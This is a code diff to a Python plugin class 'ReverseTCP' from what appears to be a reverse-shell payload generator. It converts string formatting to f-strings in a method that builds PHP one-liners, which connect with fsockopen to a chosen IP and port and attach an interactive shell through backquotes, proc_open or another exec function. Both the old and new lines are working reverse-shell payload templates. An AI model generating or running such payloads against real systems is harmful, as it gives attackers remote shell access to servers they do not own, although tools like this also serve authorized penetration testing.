@@ -27,11 +27,11 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
-        self.shell = """php -r '$sock=fsockopen("{}",{});""".format(self.args.ip, self.args.port)
+        self.shell = f"""php -r '$sock=fsockopen("{self.args.ip}",{self.args.port});"""
         if self.args.exec == "back_quote":
-            self.shell += """`{} -i <&3 >&3 2>&3`;'""".format(self.args.shell)
+            self.shell += f"""`{self.args.shell} -i <&3 >&3 2>&3`;'"""
         elif self.args.exec == "proc_open":
-            self.shell += """$proc=proc_open("{} -i",""".format(self.args.shell)
+            self.shell += f"""$proc=proc_open("{self.args.shell} -i","""
             self.shell += "array(0=>$sock, 1=>$sock,2=>$sock),$pipes);'"
         else:
-            self.shell += """{}("{} -i <&3 >&3 2>&3");'""".format(self.args.exec, self.args.shell)
+            self.shell += f"""{self.args.exec}("{self.args.shell} -i <&3 >&3 2>&3");'"""
